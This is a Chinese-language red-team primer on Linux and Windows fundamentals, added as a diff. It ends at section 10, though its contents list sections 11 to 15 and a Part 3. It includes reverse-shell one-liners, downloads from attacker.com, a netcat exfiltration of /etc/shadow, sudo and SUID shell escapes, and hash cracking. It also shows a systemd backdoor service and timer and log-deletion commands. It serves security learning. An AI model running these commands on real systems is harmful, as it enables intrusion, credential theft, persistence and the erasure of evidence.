@@ -1,0 +1,1193 @@
+================================================================================
+                        操作系统基础
+            网安基础知识系列 · 红队入门必读
+================================================================================
+
+【目录】
+  第一部分：Linux系统深度
+    一、Linux系统概述
+    二、文件系统结构 (FHS标准)
+    三、文件权限体系
+    四、进程管理
+    五、用户与组
+    六、systemd服务管理
+    七、日志系统
+    八、常用命令速查
+    九、Linux核心安全机制
+  第二部分：Windows系统
+    十、Windows NT架构
+    十一、注册表基础
+    十二、服务与进程
+    十三、用户与组
+    十四、事件日志
+    十五、权限模型
+  第三部分：红队视角总结
+
+================================================================================
+                第一部分：Linux 系统深度
+================================================================================
+
+一、Linux系统概述
+================================================================================
+
+Linux是红队最常用的操作系统，原因：
+  1. 开源免费，高度可定制
+  2. 命令行强大，适合自动化
+  3. 大量安全工具原生支持Linux（Kali Linux）
+  4. 服务器市场占有率极高
+  5. 了解Linux = 了解90%的目标服务器
+
+主要发行版(选择渗透测试用Kali/Parrot)：
+  Debian系：Debian, Ubuntu, Kali Linux, Parrot OS
+  RedHat系：RHEL, CentOS, Fedora, Rocky Linux
+  Arch系：  Arch Linux, BlackArch
+  其他：    Alpine (Docker常用), OpenSUSE
+
+内核版本格式：
+  uname -r 输出样例：5.15.0-91-generic
+  主版本.次版本.修订版本-补丁版本-特殊标识
+
+================================================================================
+二、文件系统结构 (FHS标准)
+================================================================================
+
+FHS (Filesystem Hierarchy Standard) 定义了Linux目录结构的标准。
+
+【根目录(/)下各目录详解】
+
+/ (根目录)
+|
++-- /bin/     - 基础用户命令(二进制文件)
+|   内容: ls, cp, mv, cat, bash, sh, echo, grep, chmod...
+|   现代Linux: /bin 通常是 /usr/bin 的符号链接
+|   红队: 反弹Shell常用 /bin/bash 或 /bin/sh
+|
++-- /boot/    - 启动相关文件
+|   内容: vmlinuz(内核), initrd.img(初始RAM磁盘), grub引导配置
+|   红队: 修改GRUB可绕过登录; rootkit常驻boot
+|
++-- /dev/     - 设备文件
+|   内容: sda(硬盘), tty(终端), null, zero, random, urandom
+|   特殊设备:
+|     /dev/null    - 数据黑洞，写什么都消失
+|     /dev/zero    - 无限输出零字节
+|     /dev/random  - 高质量随机数(阻塞)
+|     /dev/urandom - 伪随机数(不阻塞)
+|     /dev/tcp/host/port - bash中的虚拟TCP设备(反弹Shell)
+|     反弹Shell: bash -i >& /dev/tcp/attacker.com/4444 0>&1
+|
++-- /etc/     - 系统配置文件(最重要的目录之一)
+|   关键文件:
+|     /etc/passwd      - 用户账号信息
+|     /etc/shadow      - 用户密码哈希
+|     /etc/group       - 用户组信息
+|     /etc/hosts       - 本地主机名解析
+|     /etc/hostname    - 主机名
+|     /etc/resolv.conf - DNS解析配置
+|     /etc/fstab       - 文件系统挂载表
+|     /etc/crontab     - 系统级定时任务
+|     /etc/sudoers     - sudo权限配置(visudo编辑)
+|     /etc/ssh/sshd_config - SSH服务配置
+|     /etc/apache2/    - Apache配置
+|     /etc/nginx/      - Nginx配置
+|     /etc/mysql/      - MySQL配置
+|   红队: 获取/etc/shadow后可用hashcat破解密码
+|
++-- /home/    - 普通用户家目录
+|   内容: /home/username/, 包含用户数据、配置、SSH密钥
+|   红队: ~/.ssh/authorized_keys(后门添加) id_rsa(窃取私钥)
+|         ~/.bash_history(命令历史分析) .bashrc(持久化)
+|
++-- /lib/     - 系统库文件(libraries)
+|   通常链接到/usr/lib，.so文件(动态链接库)
+|
++-- /media/   - 可移动设备自动挂载点(U盘、光盘)
++-- /mnt/     - 临时手动挂载点
+|
++-- /opt/     - 第三方/可选软件包
+|   红队: 有些目标安装商业软件在此，可能有漏洞版本
+|
++-- /proc/    - 虚拟文件系统(进程和内核信息)
+|   内容在内存中，不占用磁盘
+|   关键文件:
+|     /proc/cpuinfo    - CPU信息
+|     /proc/meminfo    - 内存信息
+|     /proc/version    - 内核版本
+|     /proc/net/tcp    - TCP连接信息
+|     /proc/net/arp    - ARP缓存
+|     /proc/[PID]/     - 进程信息目录
+|     /proc/[PID]/cmdline  - 进程启动命令(包括参数! 可能含密码)
+|     /proc/[PID]/environ  - 进程环境变量(可能含密钥)
+|     /proc/[PID]/fd/      - 进程打开的文件描述符
+|     /proc/[PID]/exe      - 进程可执行文件的符号链接
+|     /proc/[PID]/maps     - 进程内存映射
+|     /proc/[PID]/cwd      - 进程当前工作目录
+|   红队: /proc是信息收集的金矿;检查/proc/[pid]/cmdline寻找明文密码
+|
++-- /root/    - root用户的home目录
+|   红队: 提权后访问
+|
++-- /run/     - 运行时可变数据(pid,socket等)
+|   临时文件系统(tmpfs)，重启后清空
+|
++-- /sbin/    - 系统管理命令(需root权限)
+|   内容: fdisk, iptables, ifconfig, reboot...
+|
++-- /srv/     - 服务数据(Web,FTP等)
+|
++-- /sys/     - 内核和设备信息(类似/proc，更结构化)
+|
++-- /tmp/     - 临时文件目录(所有用户可写，重启可能清空)
+|   红队: 常用作文件落地目录(因为几乎总能写入)
+|   注意: 有些系统挂载tmpfs noexec，禁止执行/tmp下的文件
+|
++-- /usr/     - 用户系统资源(User System Resources)
+|   /usr/bin/    - 大部分用户命令
+|   /usr/sbin/   - 系统管理命令
+|   /usr/lib/    - 库文件
+|   /usr/local/  - 本地安装的软件
+|   /usr/share/  - 架构无关的共享数据(手册,文档)
+|   /usr/src/    - 源代码
+|   红队: /usr/local/bin/常被添加到PATH，可放置恶意可执行文件
+|
++-- /var/     - 可变数据(variable data)
+    /var/log/       - 日志文件(详见日志章节)
+    /var/www/       - Web服务器文档根目录
+    /var/mail/      - 用户邮件
+    /var/spool/cron/ - 用户定时任务
+    /var/tmp/       - 持久临时文件(重启不删除)
+    /var/lib/mysql/ - MySQL数据库文件
+    /var/lib/docker/ - Docker数据目录
+
+FHS速记口诀（红队版）：
+  /etc -> 配置 = 找凭证、找服务配置
+  /proc -> 进程 = 信息收集、查命令/环境
+  /tmp -> 临时 = 文件落地
+  /var -> 日志 = 清除痕迹要处理
+  /home -> 用户 = 找密钥、找历史
+  /opt -> 软件 = 找第三方应用漏洞
+
+================================================================================
+三、文件权限体系
+================================================================================
+
+基本权限（查看: ls -l）：
+  -rwxr-xr-- 1 user group 1024 Jan 01 12:00 file.txt
+  |---|---|--  上述三个权限组分别代表：
+  |   |   +---- 其他用户(Others)权限 r--
+  |   +-------- 所属组(Group)权限 r-x
+  +------------ 所有者(Owner)权限 rwx
+  文件类型: -普通文件 d目录 l符号链接
+
+权限数值含义：
+  r (read)    = 4 (二进制 100)
+  w (write)   = 2 (二进制 010)
+  x (execute) = 1 (二进制 001)
+  - (无权限)  = 0 (二进制 000)
+
+组合速查：
+  --- = 0    r-- = 4    -w- = 2    --x = 1
+  r-x = 5    rw- = 6    rwx = 7    -wx = 3
+
+  例如 chmod 754 file.txt：
+    7 (rwx) = 所有者权限
+    5 (r-x) = 所属组权限
+    4 (r--) = 其他用户权限
+
+目录权限的特殊含义：
+  r = 列出目录内容(ls)
+  w = 创建/删除目录中的文件
+  x = 进入目录(cd)，必须有x才能访问目录中的文件
+
+【特殊权限】
+
+1. SUID (Set User ID) — 数值 4000
+   标记在可执行文件上，执行时以文件所有者的权限运行(而非执行者的权限)
+   显示特征: -rwsr-xr-x (所有者x位变成s)
+              -rwSr-xr-x (所有者无x时变成大写S，无实际意义)
+   经典SUID文件:
+     /usr/bin/passwd    (修改密码需要root权限)
+     /usr/bin/sudo      (需要root权限提升)
+     /usr/bin/su
+     /usr/bin/ping      (需要raw socket)
+     /usr/bin/newgrp
+   红队利用——SUID提权：
+     find / -perm -4000 -type f 2>/dev/null    # 查找所有SUID文件
+     常见可利用的SUID程序提权:
+       find . -exec /bin/sh \;        # find的-exec以root运行
+       bash -p                        # -p保留SUID权限
+       python -c "import os; os.execl('/bin/sh', 'sh', '')"
+       vim -c ':!/bin/sh'             # vim内执行shell
+       less /etc/passwd 然后输入 !/bin/sh
+       nmap --interactive 然后 !sh    # 旧版nmap
+     参考: GTFOBins (https://gtfobins.github.io)
+
+2. SGID (Set Group ID) — 数值 2000
+   可执行文件上: 以文件所属组的权限运行
+   目录上: 目录中新创建的文件继承目录的组(而非创建者的组)
+   显示: -rwxr-sr-x
+   红队：特定场景可用于权限提升和横向移动
+
+3. Sticky Bit (粘滞位) — 数值 1000
+   仅用于目录，限制删除权限
+   设置了Sticky Bit的目录，只有文件所有者和root可以删除文件
+   显示: drwxrwxrwt   (注意最后的t)
+   典型: /tmp (任何人都能创建但不能删除别人的文件)
+   红队: /tmp中的文件可能被其他用户扫描但无法删除
+
+权限掩码(umask)：
+  创建文件时的默认权限 = 666 - umask
+  创建目录时的默认权限 = 777 - umask
+  常见umask:
+    022 -> 文件644(rw-r--r--), 目录755(rwxr-xr-x)
+    027 -> 文件640(rw-r-----), 目录750(rwxr-x---)
+  查看当前: umask
+  设置: umask 077
+
+扩展文件属性 (chattr/lsattr)：
+  i属性 (Immutable): 文件无法被修改、删除、重命名、链接，root也无法修改(!)
+  a属性 (Append Only): 仅可追加内容，不能删除
+  设置: chattr +i file   取消: chattr -i file
+  红队: rootkit可能给文件设置i属性防删；反取证需先lsattr检查后移除
+
+================================================================================
+四、进程管理
+================================================================================
+
+进程状态 (ps/top STAT列)：
+  R (Running)          - 正在运行或在运行队列中
+  S (Sleeping)         - 可中断睡眠 (等待事件)
+  D (Disk sleep)       - 不可中断睡眠 (通常等待IO，不能kill)
+  T (Stopped)          - 被暂停(stop信号)或调试中
+  Z (Zombie)           - 僵尸进程(已结束但父进程未wait回收)
+  < (高优先级)          - 实时优先级进程
+  N (低优先级)          - Nice值较低的进程
+  L (锁定)              - 锁定在内存中的进程(不能换出到swap)
+  s (会话首进程)        - 进程是会话的领导者
+  l (多线程)            - 多线程进程
+  + (前台进程组)        - 进程在前台进程组中
+
+进程创建机制：fork() + exec()
+  fork():  复制当前进程(创建子进程)，子进程复制父进程内存空间
+           返回值为0表示在子进程中，>0表示在父进程中
+  exec():  用新程序替换当前进程的内存空间
+           调用后原进程代码不再执行
+  常用模式：
+    shell执行命令 -> fork()创建子进程 -> 子进程exec()执行命令 -> 父进程wait()等待
+
+信号(Signal)：
+  进程间通信的一种方式，用于控制进程行为
+  常用信号:
+    1  SIGHUP   挂起信号(守护进程收到后重读配置文件，非结束)
+    2  SIGINT   中断 (Ctrl+C发送)
+    3  SIGQUIT  退出 (Ctrl+\发送, 会生成core dump)
+    9  SIGKILL  强制终止(内核直接杀死，不可捕获/忽略/处理)
+   15  SIGTERM  终止(默认kill信号，可被捕获做清理工作)
+   18  SIGCONT  继续运行(恢复被暂停的进程)
+   19  SIGSTOP  暂停(不可捕获，用于暂停进程)
+   20  SIGTSTP  终端暂停 (Ctrl+Z发送)
+  常用命令:
+    kill -9 PID       # 强制终止
+    kill -19 PID      # 暂停进程
+    kill -18 PID      # 恢复进程
+    killall -9 name   # 按名字杀进程
+    pkill -9 -f pat   # 按模式杀进程
+  红队: 暂停EDR进程(常需要高权限); 信号处理用于rootkit隐藏
+
+进程优先级(Nice值)：
+  范围: -20(最高优先级) 到 19(最低优先级)
+  普通用户只能提高Nice值(降低优先级); root可以设置负值
+  nice -n 10 command      # 以低优先级运行
+  renice -n -5 -p PID     # 调整运行中进程优先级(需root)
+
+会话、进程组、守护进程：
+  会话(Session): 一组进程组的集合，通常始于用户登录
+  进程组(Process Group): 相关进程的集合(管道中所有进程属于同一进程组)
+  控制终端(Controlling Terminal): 会话挂载的终端
+  守护进程(Daemon): 
+    - 后台运行，无控制终端
+    - 父进程通常为init/systemd(PID=1)
+    - 脱离终端会话独立运行
+    红队应用: 后门和服务伪装为守护进程; 反向Shell通过nohup/setsid转后台
+
+进程信息收集命令：
+  ps aux                  # 查看所有进程(BSD风格)
+  ps -elf                 # 查看所有进程(Linux风格，更详细)
+  pstree -p               # 进程树+显示PID
+  top / htop              # 实时监控
+  cat /proc/[PID]/cmdline | tr '\0' ' '    # 进程启动命令(含参数)
+  cat /proc/[PID]/environ | tr '\0' '\n'   # 进程环境变量
+  cat /proc/[PID]/status  # 进程状态信息
+  cat /proc/[PID]/maps    # 内存映射(分析ASLR)
+  lsof -p PID             # 进程打开的文件
+  lsof -i                 # 进程使用的网络连接
+  netstat -antup / ss -tlnp  # 网络连接与关联进程
+
+================================================================================
+五、用户与组
+================================================================================
+
+/etc/passwd 文件格式（冒号分隔的七个字段）：
+  root:x:0:0:root:/root:/bin/bash
+  |    | | | |    |     +------ Shell
+  |    | | | |    +------------ 家目录
+  |    | | | +----------------- 用户描述(GECOS字段)
+  |    | | +------------------- 主组GID
+  |    | +--------------------- UID (用户ID)
+  |    +----------------------- 密码占位符 (x表示密文在shadow)
+  +---------------------------- 用户名
+
+关键UID范围：
+  UID 0:    root（超级用户，系统内唯一真正需要UID=0的账户）
+  UID 1-99: 系统用户（守护进程、服务账户）
+  UID 100-999: 动态系统账户
+  UID 1000+: 普通用户（从1000开始分配，某些系统从500开始）
+  红队检查: grep ":0:" /etc/passwd | grep -v root
+            查看是否有UID=0的非root用户，那是后门或历史遗留提权点！
+
+/etc/shadow 文件格式：
+  user:$6$salt$hash:19000:0:99999:7:::
+  |    |             |     | |     | |
+  |    |             |     | |     | +-- 保留字段
+  |    |             |     | |     +---- 账号过期天数
+  |    |             |     | +--------- 密码过期警告天数
+  |    |             |     +----------- 密码最大有效天数
+  |    |             +----------------- 密码最小天数(0=随时可改)
+  |    +------------------------------- 密码最后修改日期(距1970.1.1天数)
+  +------------------------------------ 用户名
+
+密码哈希前缀识别：
+  $1$  -> MD5 (弱! 易碰撞)
+  $2a$ -> Blowfish (bcrypt)
+  $2y$ -> Blowfish (bcrypt, PHP风格)
+  $5$  -> SHA-256 (crypt)
+  $6$  -> SHA-512 (crypt, Linux默认)
+  $y$  -> yescrypt (较新的算法)
+  !!   -> 账户已锁定/无密码
+  !   -> 密码已锁定
+
+破解方法：
+  john /etc/shadow
+  hashcat -m 1800 -a 0 hash.txt wordlist.txt   # $6$ 是模式1800
+  hashcat -m 500 -a 3 hash.txt ?l?l?l?l?l?l    # $1$ 是模式500
+
+/etc/group 文件格式：
+  groupname:x:GID:user1,user2,user3
+  sudo:x:27:alice,bob
+
+  查看用户所属组: groups username 或 id username
+
+sudo 权限管理(/etc/sudoers，通过visudo编辑)：
+  基本格式:
+    user    HOST=(RUNAS:GROUP) TAG:COMMAND
+    alice   ALL=(ALL:ALL) ALL               # alice可执行任何命令
+    bob     ALL=(ALL) NOPASSWD: /usr/bin/docker  # bob免密执行docker
+    %admin  ALL=(ALL) ALL                   # admin组所有成员有完整sudo
+
+  红队提权检查:
+    sudo -l        # 列出当前用户可执行的sudo命令
+    GTFOBins查找   # https://gtfobins.github.io 查哪些命令可用于提权
+    经典利用sudo提权的命令:
+      vim -> sudo vim -c ':!/bin/bash'
+      less -> sudo less /etc/passwd, 然后按 !/bin/bash
+      find -> sudo find /etc -exec /bin/sh \;
+      awk -> sudo awk 'BEGIN {system("/bin/sh")}'
+      python -> sudo python -c 'import pty;pty.spawn("/bin/bash")'
+      nmap -> sudo nmap --interactive, 然后 !sh
+      man -> sudo man man, 然后 !/bin/bash
+      git -> sudo git -p help config, 然后 !/bin/bash
+
+关键用户相关文件（红队信息收集/持久化目标）：
+  ~/.ssh/authorized_keys    - SSH公钥（添加自己公钥=无密码登录后门）
+  ~/.ssh/id_rsa             - SSH私钥（窃取后无密码登录其他机器）
+  ~/.ssh/known_hosts        - 已知主机(横向移动方向)
+  ~/.bash_history           - 命令历史（可能含明文密码、内网IP）
+  ~/.bashrc / .profile / .zshrc - Shell配置（持久化注入点）
+  ~/.aws/credentials        - AWS凭证
+  ~/.gitconfig              - Git配置
+  /etc/sudoers.d/           - sudo配置碎片目录
+  /etc/crontab + /var/spool/cron/crontabs/ - 定时任务
+  /etc/polkit-1/            - PolicyKit规则 (pkexec提权相关)
+
+================================================================================
+六、systemd服务管理
+================================================================================
+
+systemd是现代Linux的标准init系统(PID=1)，取代了SysV init和Upstart。
+
+systemctl常用命令：
+  systemctl list-units --type=service     # 列出所有服务
+  systemctl list-units --type=service --state=running  # 运行中的服务
+  systemctl status nginx                  # 查看服务详细状态
+  systemctl start/stop/restart nginx      # 启动/停止/重启
+  systemctl enable/disable nginx          # 设置/取消开机自启
+  systemctl is-enabled nginx              # 检查是否开机自启
+  systemctl daemon-reload                 # 重新加载systemd配置
+  systemctl cat nginx                     # 查看服务单元文件内容
+  journalctl -u nginx                     # 查看某个服务的日志
+
+服务单元文件结构(/etc/systemd/system/或/lib/systemd/system/)：
+  [Unit]
+  Description=My Backdoor Service        # 描述
+  After=network.target                   # 在网络启动后启动
+  Before=other.service                   # 在某服务之前启动
+  Requires=network.target                # 强依赖
+  Wants=network.target                   # 弱依赖
+
+  [Service]
+  Type=simple                            # 服务类型(详见下方)
+  ExecStart=/usr/local/.backdoor.sh      # 启动命令
+  ExecStop=/bin/kill $MAINPID            # 停止命令
+  Restart=always                         # 失败时自动重启
+  RestartSec=10                          # 重启间隔(秒)
+  User=root                              # 以哪个用户运行
+  Group=root
+  WorkingDirectory=/tmp                  # 工作目录
+  Environment="VAR=value"                # 环境变量
+  StandardOutput=null                    # 标准输出如何处理
+
+  [Install]
+  WantedBy=multi-user.target             # 在哪个target被激活
+
+Service Type详解：
+  simple:    主进程就是ExecStart启动的进程(最常见，默认)
+  forking:   ExecStart启动的进程会fork()后父进程退出，子进程继续运行
+             需要指定PIDFile
+  oneshot:   一次性任务，执行完就退出，常配合RemainAfterExit=yes
+  notify:    类似simple但进程启动完成后发送sd_notify通知就绪
+  idle:      等待所有任务完成后再启动(延迟启动)
+
+红队持久化方式（利用systemd）：
+  1. 创建自己的恶意服务文件，enable后开机自启
+  2. 修改现有服务(如sshd)的ExecStart，附加恶意命令
+  3. 利用systemd Timer创建定期任务(替代cron)
+  4. systemd user service (~/.config/systemd/user/)——不需要root
+
+systemd target（系统启动级别，取代runlevel）：
+  multi-user.target    = 多用户命令行 (原runlevel 3)
+  graphical.target     = 图形界面 (原runlevel 5)
+  rescue.target        = 救援模式（单用户，基本系统服务）
+  emergency.target     = 紧急模式（最小环境，root shell）
+  reboot.target / poweroff.target = 重启/关机
+
+systemd定时器(替代cron)示例(/etc/systemd/system/backdoor.timer)：
+  [Unit]
+  Description=Run backdoor every hour
+
+  [Timer]
+  OnBootSec=5min                        # 启动后5分钟运行
+  OnUnitActiveSec=1h                    # 每1小时运行
+  Persistent=true                       # 如果错过时间点，启动时补运行
+
+  [Install]
+  WantedBy=timers.target
+
+================================================================================
+七、日志系统
+================================================================================
+
+【主要日志文件 (/var/log/)】
+
+系统日志：
+  /var/log/syslog         - Debian系通用系统日志(root所有)
+  /var/log/messages       - RedHat系通用系统日志
+  /var/log/kern.log       - 内核日志
+  /var/log/dmesg          - 内核环形缓冲区(启动时硬件信息)
+  /var/log/boot.log       - 系统启动日志
+
+认证日志(红队最关注!)：
+  /var/log/auth.log       - Debian系: SSH登录、sudo操作、认证事件
+  /var/log/secure         - RedHat系: 认证日志
+  /var/log/faillog        - 登录失败记录(faillog命令读取)
+  /var/log/lastlog        - 所有用户最后登录时间(lastlog命令读取)
+  在这些日志中查找:
+    - 成功的SSH登录(来源IP、用户名)
+    - 失败的登录尝试(暴力破解)
+    - sudo提权记录
+    - 认证成功的服务
+
+Web服务日志：
+  /var/log/apache2/access.log   - Apache访问日志
+  /var/log/apache2/error.log    - Apache错误日志
+  /var/log/nginx/access.log     - Nginx访问日志
+  /var/log/nginx/error.log      - Nginx错误日志
+  日志中包含: 访问者IP, 时间戳, 请求方法, URL, UA, 状态码, Referer
+
+其他服务日志：
+  /var/log/mysql/error.log      - MySQL错误日志
+  /var/log/mysql/mysql.log      - MySQL查询日志(如果开启)
+  /var/log/mail.log             - 邮件传输日志
+  /var/log/cron                 - 定时任务执行日志
+  /var/log/audit/audit.log      - 审计守护进程日志(auditd)
+  /var/log/btmp                 - 失败登录记录(lastb命令读取)
+
+用户活动记录：
+  /var/log/wtmp                 - 登录历史(who/up命令读取, last命令显示)
+  /var/run/utmp                 - 当前登录用户(who/w命令读取)
+  ~/.bash_history               - 用户shell命令历史
+  ~/.mysql_history              - MySQL客户端历史
+  ~/.viminfo                    - Vim操作历史
+  ~/.lesshst                    - Less操作历史
+
+journalctl (systemd日志系统)：
+  journalctl                          # 查看所有日志(按时间排序)
+  journalctl -u ssh.service           # 指定服务日志
+  journalctl -u ssh --since today     # 今天的日志
+  journalctl -u ssh --since "1 hour ago"  # 最近1小时
+  journalctl -f                       # 实时跟踪(follow模式)
+  journalctl -k                       # 只显示内核日志
+  journalctl --list-boots             # 列出所有启动记录
+  journalctl -b -1                    # 查看上一次启动的日志
+  journalctl _UID=1000                # 按UID过滤
+  journalctl -p err                   # 只看错误级别以上
+
+【红队日志操作】
+
+1. 信息收集阶段：
+   - 分析auth.log确认管理员登录模式(什么时间，从哪)
+   - 从Web日志确认WebApp的URL结构和访问来源
+   - 从.bash_history发现内部IP、密码、常用命令
+   - 从cron日志了解自动化任务和脚本路径
+
+2. 痕迹清除阶段：
+   简单方法(风险高，会被发现):
+     sed -i '/attacker_ip/d' /var/log/auth.log     # 删除特定IP的行
+     echo "" > /var/log/auth.log                    # 清空日志(非常可疑!)
+     rm /var/log/auth.log && touch /var/log/auth.log # 删除重建
+   专业方法:
+     使用logtamper / CoverMyAss / 手动修改二进制wtmp文件
+     只删除关键行而不是整个文件
+     覆盖写入让时间戳合理
+   关键认知:
+     如果日志通过rsyslog实时转发到远程SIEM(Splunk/ELK/Wazuh)，
+     本地清除无效！需要确认日志架构。
+     检查: cat /etc/rsyslog.conf | grep @   # 查看远程转发
+     最保险的方式: 使用跳板/代理隐藏真实攻击IP
+
+3. 日志配置分析：
+   /etc/rsyslog.conf          - rsyslog主配置(传统日志守护进程)
+   /etc/rsyslog.d/            - rsyslog配置片段目录
+   /etc/audit/rules.d/        - auditd审计规则
+   /etc/default/locale         - 系统语言(影响日志编码)
+
+================================================================================
+八、常用命令速查（红队信息收集专用）
+================================================================================
+
+【系统信息收集】
+  whoami                 # 当前用户
+  id                     # 当前用户UID/GID/组
+  uname -a               # 系统内核版本和架构
+  cat /etc/os-release    # 发行版和版本号
+  cat /etc/issue         # 发行版信息
+  hostname               # 主机名
+  hostname -I            # 所有IP地址
+  cat /proc/version      # 编译内核的GCC版本
+  cat /proc/cpuinfo      # CPU信息
+  lscpu                  # CPU架构信息
+  free -h                # 内存使用
+  df -h                  # 磁盘使用
+  lsblk                  # 块设备(磁盘分区)信息
+
+【网络信息收集】
+  ip a                   # 所有网卡IP配置
+  ifconfig               # 网卡配置(传统命令)
+  ip route               # 路由表
+  route -n               # 路由表(传统命令)
+  ip neigh               # ARP缓存(邻居表)
+  arp -a                 # ARP缓存(传统命令)
+  ss -tlnp               # TCP监听端口(比netstat快)
+  ss -anup               # UDP监听端口
+  netstat -antup         # 所有连接+进程名
+  iptables -L -n         # IPv4防火墙规则
+  iptables -t nat -L -n  # NAT表(端口转发)
+
+【进程和服务】
+  ps aux                 # 所有进程(BSD格式)
+  ps -elf                # 所有进程(Linux格式)
+  pstree -p              # 进程树
+  systemctl list-units --type=service --state=running  # 运行中的服务
+  service --status-all   # 服务状态(SysV兼容)
+
+【用户和权限】
+  w / who                # 谁在线(从哪里登录)
+  last                   # 登录历史
+  lastlog                # 所有用户最后登录时间
+  cat /etc/passwd        # 用户列表
+  cat /etc/group         # 组列表
+  sudo -l                # 当前用户的sudo权限
+  find / -perm -4000 -type f 2>/dev/null   # 找SUID文件
+  find / -perm -2000 -type f 2>/dev/null   # 找SGID文件
+  getcap -r / 2>/dev/null                 # 找有capability的文件
+  find / -writable -type d 2>/dev/null    # 找可写目录
+
+【文件查找】
+  find / -name "*.conf" -type f 2>/dev/null       # 找配置文件
+  find / -name "*flag*" -type f 2>/dev/null        # CTF找flag
+  grep -r "password" /etc/ 2>/dev/null             # 搜索密码关键词
+  grep -r "DB_PASS\|DB_PASSWORD\|DATABASE_URL" /var/www/ 2>/dev/null
+  locate passwd / locate ssh    # 快速查找(取决于updatedb更新)
+  ls -laRa /home/               # 递归列出家目录所有文件
+  find / -name "id_rsa" -o -name "*.pem" 2>/dev/null  # 找SSH私钥
+  find / -name ".bash_history" -exec cat {} \; 2>/dev/null  # 读所有历史
+
+【文件传输和下载】
+  curl -o file http://attacker.com/tools
+  wget http://attacker.com/tools -O /tmp/tools
+  python3 -m http.server 8000      # 简易HTTP服务器(文件传输)
+  nc -lvnp 4444 > received_file   # Netcat接收文件
+  base64 /etc/shadow | tr -d '\n' | nc attacker.com 4444  # base64传输数据
+  scp file user@192.168.1.5:/path/  # SSH安全复制
+  rsync -av /data/ user@host:/backup/  # 同步文件
+
+【反弹Shell】
+  # Bash
+  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+  # Netcat (nc)
+  nc -e /bin/sh 10.0.0.1 4444         # 传统nc
+  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 >/tmp/f  # OpenBSD nc
+
+  # Python
+  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+  # PHP
+  php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+  # 升级为交互式Shell
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+  Ctrl+Z -> stty raw -echo; fg -> Enter
+
+================================================================================
+九、Linux核心安全机制
+================================================================================
+
+防火墙 (iptables/nftables)：
+  iptables -L -n           # 查看规则链
+  iptables -L -n -v        # 详细(含流量计数)
+  iptables -L -n -t nat    # 查看NAT表
+  主要链: INPUT(入站) FORWARD(转发) OUTPUT(出站)
+  红队关注:
+    - 检查OUTPUT链是否限制出站(限制反弹Shell)
+    - 检查FORWARD链是否限制横向移动
+    - nftables是iptables的现代替代(语法不同)
+    绕过: 使用允许的端口(80/443/53)做反弹
+
+SELinux (CentOS/RHEL默认MAC系统)：
+  三种模式:
+    Enforcing:  强制模式(阻止+记录)
+    Permissive: 宽容模式(只记录不阻止，供调试)
+    Disabled:   完全禁用
+  查看状态: getenforce / sestatus
+  临时关闭: setenforce 0 (需要root)
+  红队:
+    - SELinux可能阻止反弹Shell的某些操作
+    - 禁止某些目录(/tmp)执行文件
+    - 限制服务访问非标准端口
+    - 可以用chcon修改文件上下文绕过部分限制
+
+AppArmor (Debian/Ubuntu默认MAC系统)：
+  类似SELinux但更简单，基于路径而非标签
+  aa-status                # 查看状态
+  /etc/apparmor.d/         # 规则配置目录
+  aa-disable /usr/sbin/cupsd  # 禁用某服务的AppArmor
+  红队: 检查哪些服务有AppArmor限制，寻找弱配置
+
+内核安全参数：
+  kptr_restrict:    限制/proc/kallsyms访问(隐藏内核符号地址)
+  dmesg_restrict:   限制dmesg访问(防止泄露内核日志)
+  kernel.yama.ptrace_scope: 限制ptrace范围(1=只能ptrace子进程)
+  kernel.kexec_load_disabled: 禁止kexec(替换运行内核)
+  查看: sysctl -a 2>/dev/null | grep restrict
+
+Capabilities (能力细分)：
+  Linux将传统root的全部权限细分为独立的capability位
+  重要capability:
+    CAP_NET_RAW      - 原始套接字(需要此权限才能ping, nmap)
+    CAP_NET_BIND_SERVICE - 绑定<1024端口
+    CAP_SYS_ADMIN    - 接近root的超级能力(大量系统管理操作)
+    CAP_SYS_PTRACE   - ptrace其他进程(内存读写, 代码注入)
+    CAP_DAC_READ_SEARCH - 绕过文件读权限检查
+    CAP_SYS_MODULE   - 加载/卸载内核模块
+  工具:
+    capsh --print     # 当前shell的capability
+    getcap -r / 2>/dev/null   # 查找有capability的文件
+    setcap cap_net_raw+ep /usr/bin/python3  # 给文件添加capability
+  红队: 有CAP_SYS_PTRACE可以注入其他进程;CAP_DAC_READ_SEARCH可读shadow
+
+================================================================================
+                第二部分：Windows 系统
+================================================================================
+
+十、Windows NT架构
+================================================================================
+
+Windows NT（New Technology）是现代Windows(2000/XP/Vista/7/8/10/11及Server系列)的基础架构。
+
+简化架构层次图：
+
+  +------------------------------------------------+
+  |            用户模式 (User Mode)                 |
+  |  +----------+ +-----------+ +--------------+   |
+  |  | 用户进程  | | 子系统DLL  | | 环境子系统    |   |
+  |  | (EXE)    | |(kernel32) | |(Win32/POSIX) |   |
+  |  +----+-----+ +-----+-----+ +------+-------+   |
+  |       +--------------+-------------+           |
+  |                      |                         |
+  |         +------------+------------+            |
+  |         |    ntdll.dll            |            |
+  |         |  (系统调用接口/Stub)    |            |
+  |         +------------+------------+            |
+  +----------------------+-------------------------+
+                         | syscall/sysenter
+  +----------------------+-------------------------+
+  |            内核模式 (Kernel Mode)               |
+  |         +------------+------------+            |
+  |         |      NTOSKRNL.EXE         |           |
+  |         |  (执行体 + 内核 + 驱动层)  |           |
+  |         +---------------------------+           |
+  |         +----------+ +-----------+              |
+  |         | 设备驱动  | | HAL(硬件) |              |
+  |         +----------+ +-----------+              |
+  +------------------------------------------------+
+
+核心概念：
+  Process (进程):   资源容器，拥有独立虚拟地址空间(4GB=2GB用户+2GB内核)
+                   PE文件格式(.exe/.dll)是进程代码的标准格式
+  Thread (线程):    进程内的执行单元，同一进程的线程共享地址空间
+  Handle (句柄):    对内核对象的引用(文件、进程、线程、注册表键等)
+                   使用前需通过OpenProcess/OpenThread等获取
+  Token (令牌):     进程的安全上下文，包含用户SID、组、特权、完整性级别
+  Job Object:       进程组管理(限制CPU/内存)
+
+红队核心关联：
+  - ntdll.dll是用户态到内核态的桥梁(通过syscall)
+  - EDR通常hook ntdll.dll的导出函数来监控进程行为
+  - 绕过方式: 直接syscall(不用ntdll的stub); 或加载一份干净的ntdll
